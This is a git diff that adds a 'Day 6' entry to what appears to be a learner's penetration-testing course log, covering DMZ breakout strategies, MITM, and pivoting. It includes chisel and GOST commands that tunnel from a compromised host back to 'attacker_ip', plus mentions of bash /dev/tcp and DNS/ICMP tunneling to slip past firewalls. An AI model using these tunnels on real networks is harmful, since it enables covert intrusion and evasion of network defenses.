@@ -315,3 +315,74 @@ We worked mainly on UNIX-like systems and explored four key techniques:
 - **pspy** → Lets you monitor processes (including cron jobs) without needing root — very handy for spotting escalation opportunities.
 
 Privilege escalation isn’t just about running exploits blindly. It’s about methodically enumerating, spotting weak configurations, and chaining small misconfigurations into a big win. 
+
+---
+
+### Day 6 - Going Beyond the DMZ & Route Network Traffic
+
+So far, we’ve been poking around systems that are exposed to the internet. But in reality, the juicy stuff often lives behind the DMZ (Demilitarised Zone) — the part of a network that separates public-facing services from the internal, private ones. Day 6 was all about learning how attackers break past that barrier and move inside.
+
+**Methods to Break Beyond the DMZ**
+
+There are multiple strategies attackers can use:
+
+1. **Compromise DMZ hosts** → Servers in the DMZ often act as a bridge to the internal network.
+
+2. **Compromise network equipment** → Routers/firewalls can be reconfigured to allow deeper access.
+
+3. **Compromise users** → Tricking users who legitimately access DMZ services.
+
+4. **Look for loopholes** → Misconfigured access rules between segments (e.g., protocols that shouldn’t be allowed but are).
+
+**Techniques We Explored:**
+
+- **Network Scanning** → Using tools like `nmap` or `naabu` (a faster alternative) to find open ports that could be abused.
+
+- **Traffic Analysis** → Capturing and studying packets with Wireshark or tcpdump to spot weaknesses.
+
+- **MITM Attacks** → Spoofing traffic between hosts and servers to intercept or alter communications.
+
+**Pivoting: Moving Through the Network**
+
+Once inside one machine, the next challenge is to pivot — use the compromised host as a bridge to access other internal systems.
+
+Tools that make this possible:
+
+- **Chisel** → A fast TCP/UDP tunnel, often used for port forwarding.
+
+*Example:*
+
+On attacker's machine:
+`chisel server -p 8000 --reverse`
+
+On compromised machine:
+`chisel client attacker_ip:8000 R:8080:127.0.0.1:22`
+
+This sets up a reverse tunnel so the attacker can access the target’s SSH port (22) through port 8080 on their own machine.
+
+- **GOST** → A more advanced tunneling tool that supports encryption and multiple proxy modes.
+
+*Example:*
+
+`gost -L=:1080 -F=socks5://attacker_ip:1080`
+
+
+This sets up a **SOCKS5 proxy** that routes traffic securely through the compromised host.
+
+**Auxiliary Tools:**
+
+- **socat** → General-purpose relay for networking, useful for tunneling.
+
+- **Plain old bash** → Sometimes used with redirection (`/dev/tcp/host/port`) for quick-and-dirty pivoting.
+
+We also explored covert tunneling techniques that use protocols in *unintended* ways:
+
+- **DNS Tunneling** → Data is encoded inside DNS queries/responses, allowing attackers to bypass firewalls that allow DNS traffic.
+
+- **ICMP Tunneling** → Data is hidden inside ICMP packets (like ping). Since ICMP is often overlooked, it can be abused for sneaky communication.
+
+Getting inside a network is one thing. **Moving deeper without getting caught is another game entirely.** Pivoting and tunneling techniques show how attackers can turn one foothold into full internal access — often by reusing “normal” protocols in abnormal ways.
+
+---
+
+### Day 7 - Privilege Escalation on Local Network Nodes (OS Windows)
